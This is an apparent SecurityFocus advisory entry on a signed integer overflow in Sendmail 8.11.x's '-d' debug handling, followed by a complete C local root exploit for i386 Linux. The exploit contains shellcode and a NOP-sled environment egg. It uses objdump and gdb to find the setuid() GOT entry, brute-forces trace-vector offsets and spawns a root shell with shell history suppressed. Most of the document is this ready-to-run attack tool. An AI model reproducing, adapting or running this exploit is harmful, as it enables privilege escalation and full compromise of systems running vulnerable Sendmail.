source: http://www.securityfocus.com/bid/3163/info
 
An input validation error exists in Sendmail's debugging functionality.
 
The problem is the result of the use of signed integers in the program's tTflag() function, which is responsible for processing arguments supplied from the command line with the '-d' switch and writing the values to it's internal "trace vector." The vulnerability exists because it is possible to cause a signed integer overflow by supplying a large numeric value for the 'category' part of the debugger arguments. The numeric value is used as an index for the trace vector, and can therefore be used to write within a certain range of proces memory if a negative value is given.
 
Because the '-d' command-line switch is processed before the program drops its elevated privileges, this could lead to a full system compromise. This vulnerability has been successfully exploited in a laboratory environment.

/*
 * sendmail 8.11.x exploit (i386-Linux) by sd@sf.cz (sd@ircnet)
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * fixed by Marcin Bukowski <insect@insect.hack.pl>
 *
 * <insect> I'll change, and fix this code requested by friend
 *          for him
 *
 * -d specify depth of analysis (32) [bigger = more time]
 * -o change offset (-32000) [between 1000..-64000]
 * -v specify victim (/usr/sbin/sendmail) [suided binary]
 * -t specify temp directory (/tmp/.s11x)
 *
 * simply try to run an exploit without parameters
 * ---------------------------------------------------------------
 *
 */



#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <signal.h>
#include <wait.h>
#include <sys/stat.h>

#define SM "/usr/sbin/sendmail"

#define OBJDUMP "objdump"

#define GDB "gdb"

#define GREP "grep"

#define COPYCMD "/bin/cp"

#define RMCMD "/bin/rm"

#define OURDIR "/tmp/.s11x"

#define DLINE \
"%s -d %s 2> /dev/null | %s -B %d \
\"mov.*%%.l,(%%e..,%%e..,1)\" |\
%s \".mov.*0x80.*,%%e..\""

#define DLINEA OBJDUMP, vict, GREP, depth, GREP

#define BRUTE_DLINE \
"%s -d %s 2> /dev/null | %s \
\".mov.*0x80.*,%%e..\""

#define BRUTE_DLINEA OBJDUMP, vict, GREP

#define NOPLEN 32768

#define NOP 0x90

char shellcode[] =
"\xeb\x0c\x5b\x31\xc0\x50\x89\xe1\x89"
"\xe2\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff";

char scode[512];

char dvict[] = SM;

struct target {
 uint off;
 uint brk;
 uint vect;
};

unsigned int get_esp() {
 __asm__("movl %esp,%eax");
}

char ourdir[256] = OURDIR;

void giveup(int i) {
 char buf[256];
 sprintf(buf, "%s -rf %s > /dev/null 2> /dev/null",
         RMCMD, ourdir);
 system(buf);
// printf("[*] removing temp directory - %s\n",
//  ourdir);
 if (i >= 0) exit(i);
}

void sploit(char *victim, uint got, uint vect, uint ret) {
 unsigned char egg[sizeof(scode) + NOPLEN + 5];
 char s[512] = "-d";
 char *argv[3];
 char *envp[2];
 uint first, last, i;

 strcpy(egg, "EGG=");
 memset(egg + 4, NOP, NOPLEN);
 strcpy(egg + 4 + NOPLEN, scode);
 last = first = -vect - (0xffffffff - got + 1);
 while (ret) {
  char tmp[256];
  i = ret & 0xff;
  sprintf(tmp, "%u-%u.%u-", first, last, i);
  strcat(s, tmp);
  last = ++first;
  ret = ret >> 8;
 }
 s[strlen(s) - 1] = 0;
 argv[0] = victim;
 argv[1] = s;
 argv[2] = NULL;
 envp[0] = egg;
 envp[1] = NULL;
 execve(victim, argv, envp);
}

int use(char *s) {
 printf("\n%s [command] [options]\n"
        "-h this help\n"
        "-d specify depth of analysis (32)\n"
        "-o change offset (-32000)\n"
        "-v specify victim (/usr/sbin/sendmail)\n"
        "-t specify temp directory (/tmp/.s11x)\n"
        "-b enables bruteforce (it can take 20-30 mins)\n", s);
 return 1;
}

int exploited = 0;

void sigusr(int i) {
 exploited++;
 giveup(-1);
}

int main(int argc, char *argv[]) {
 char victim[256] = SM;
 char vict[256],gscr[256],
      path[256],d[256],buf[256];
 struct stat st;
 FILE *f;
 struct target t[1024];
 uint off,ep,l;
 int i,j,got,esp;
 int offset = -16384;
 int depth = 32;
 int brute = 0;

 if (!*argv) {
  dup2(2, 0);
  dup2(2, 1);
  setuid(0);
  setgid(0);
  kill(getppid(), SIGUSR1);
  printf(
   "------(*)>+== "
   "ENTERING ROOT SHELL"
   " ==+<(*)------"
   );
  fflush(stdout);
  chdir("/");
  setenv("PATH",
   "/bin:/usr/bin:/usr/local/bin:"
   "/sbin:/usr/sbin:/usr/local/sbin:"
   "/opt/bin:${PATH}",1);
  setenv("BASH_HISTORY",
   "/dev/null", 1);
  execl("/bin/bash", "-bash", NULL);
 }
 printf(
  "  ------------------------------------------------\n"
  "   Sendmail 8.11.x linux i386 exploit  \n"
  "                  wroten by sd@sf.cz [sd@ircnet], \n"
  "                   fixed by insect@insect.hack.pl \n"
  "  ------------------------------------------------\n"
  "   type \"%s -h\" to get help\n",argv[0]
 );

while ((i=getopt(argc,argv,"hd:o:v:t:b"))!=EOF){
 switch (i) {
  case 'd':
   if ((!optarg)||(sscanf(optarg,"%d",&depth)!=1))
    return use(argv[0]);
  break;
  case 'o':
   if ((!optarg)||(sscanf(optarg,"%d",&offset)!=1))
    return use(argv[0]);
  break;
  case 'v':
   if (!optarg)
    return use(argv[0]);
   strcpy(victim,optarg);
  break;
  case 't':
   if (!optarg)
    return use(argv[0]);
   strcpy(ourdir, optarg);
  break;
  case 'b':
   brute++;
  break;
  case 'h':
  default:
   return use(argv[0]);
 }
}
 if (brute)
  printf(
   "[*] brute force "
   "to 20-30mins\n");
 path[0] = 0;
 if (argv[0][0] != '/') {
  getcwd(path, 256);
 }
 sprintf(scode, "%s%s/%s",
    shellcode, path, argv[0]);
 esp = get_esp();
 close(0);
 signal(SIGUSR1, sigusr);
 giveup(-1);
 printf(
  " [Victim=%s][Depth=%d][Offset=%d]\n"
  " [Temp=%s][Offset=%d][ESP=0x%08x]\n",
   victim, depth, offset, ourdir, esp
 );
stat(victim, &st);
if ((st.st_mode & S_ISUID) == 0) {
 printf("[!] Error: %s doesn't have SUID mode\n",
        victim);
}
if (access(victim, R_OK + X_OK + F_OK) < 0) {
 printf("[!] Error: %s must exist, have mode +rx\n",
        victim);
}
if (mkdir(ourdir, 0777) < 0) {
 perror("[!] Error: creating temporary directory\n");
 giveup(1);
}
//printf("[*] creating temp directory - %s\n",
//      ourdir);
sprintf(buf, "%s -R %s | %s setuid",
        OBJDUMP, victim, GREP);
f = popen(buf, "r");
if (fscanf(f, "%x", &got) != 1) {
 pclose(f);
 printf("[!] Error: cannot get "
        "setuid() GOT\n");
 giveup(1);
}
 pclose(f);
 printf("[*] --> Step 1. setuid() "
        "[got=0x%08x]\n", got);
 sprintf(vict, "%s/sm", ourdir);
 printf("[*] --> Step 2. copy "
        "[%s->%s]\n", victim, vict);
 fflush(stdout);
 sprintf(buf, "%s -f %s %s",
         COPYCMD, victim, vict);
 system(buf);
 if (access(vict,R_OK+X_OK+F_OK)<0){
  printf(
   "[!] Error: copy victim to out temp\n");
  giveup(1);
 }

 printf(
    "[*] --> Step 3. disassm our "
    "[%s]\n", vict);
 fflush(stdout);
 if (!brute) {
  sprintf(buf,DLINE,DLINEA);
 } else {
  sprintf(buf,BRUTE_DLINE,BRUTE_DLINEA);
 }
 f = popen(buf, "r");
 i = 0;
 while (fgets(buf,256,f)) {
  int k, dontadd=0;
  if (sscanf(buf,
       "%x: %s %s %s %s %s %s 0x%x,%s\n",
        &ep,d,d,d,d,d,d,&off,d)==9){
   for (k=0;k<i;k++){
    if (t[k].off==off)
     dontadd++;
   }
   if (!dontadd) {
    t[i].off = off;
    t[i++].brk = ep;
   }
  }
 }
 pclose(f);
 sprintf(gscr, "%s/gdb", ourdir);
 off = 0;
 for (j=0; j < i; j++) {
  f = fopen(gscr, "w+");
  if (!f) {
   printf("[!] Error: Cannot create gdb script\n");
   giveup(1);
  }
  fprintf(f,
    "break *0x%x\nr -d1-1.1\nx/x 0x%x\n",
    t[j].brk, t[j].off);
  fclose(f);
  sprintf(buf,
    "%s -batch -x %s %s 2> /dev/null",
    GDB, gscr, vict);
  f = popen(buf, "r");
  if (!f) {
   printf("[!] Error: Failed to spawn gdb!\n");
   giveup(1);
  }
  while (1) {
   char buf[256];
   char *p;
   t[j].vect = 0;
   p = fgets(buf, 256, f);
   if (!p) break;
   if (sscanf(p,"0x%x %s 0x%x",&ep,d,&l)==3){
    t[j].vect = l;
    off++;
    break;
   }
  }
  pclose(f);
  if (t[j].vect) {
   int pid;
   printf(" ++[%d/%d](%d%%) "
          "GOT=0x%08x,VECT=0x%08x,"
          "OFF=%d\n", j, i, j*100/i,
          got, t[j].vect, offset);
   fflush(stdout);
   pid = fork();
   if (pid == 0) {
    close(1);
    sploit(victim,got,t[j].vect,esp+offset);
   }
   wait(NULL);
   if (exploited) {
    wait(NULL);
    printf("        [-*-] We rule! BYE! [-*-]\n");
    exit(0);
   }
  }
 }
 printf(
  "[!] ERROR: all targets failed,"
  "probably not buggie\n");
 giveup(1);
}

